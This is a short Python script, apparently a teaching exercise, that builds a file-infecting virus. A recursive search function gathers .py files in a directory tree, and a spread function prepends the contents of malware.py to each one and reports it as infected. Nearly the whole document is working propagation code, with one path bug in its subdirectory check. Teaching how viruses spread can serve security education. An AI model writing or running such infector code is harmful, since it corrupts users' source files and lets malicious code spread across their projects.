## Implement the search function.
import os
def search(path):
    # 1. Define "filestoinfect" as an empty list.
    filestoinfect = []
    # 2. Find the list of files/subdirectories in the specified path and save them in variable "filelist".
    filelist = os.listdir(path)
    # 3. for name in filelist:
    for name in filelist:
        # 3.a. Check if name is a subdirectory. If true, call again the search function in this subdirectory.
        # HINT: To avoid reset filestoinfect when you call the function, use filestoinfect.extend(search(path+"/"+name))
        if os.path.isdir("SpreadingTheWord/"+name):
            filestoinfect.extend(search(path+"/"+name))
        # 3.b. Else, if it is a .py file, append it to "filestoinfect"
        elif name[-3:] == ".py" and "malware" not in name:
            filestoinfect.append(path+"/"+name)
    return filestoinfect

## Use the search function in the current directory
filestoinfect = search(os.path.abspath("SpreadingTheWord"))
print("List of files to infect:\n")
print(filestoinfect)

def spread(filestoinfect):
    malware = open('/content/SpreadingTheWord/malware.py').read()
    for name in filestoinfect:
        # 1. Open the file, load the instructions in a temp variable and close the file.
        f = open(name)
        temp = f.read()
        f.close()
        # 2. Open the the file in "write mode" and write the malware and close the file.
        f = open(name,'w')
        f.write(malware+temp)
        f.close()
        print("File "+name.split("/")[-1]+" has been infected!")
    return

spread(filestoinfect)
print('Hello world!')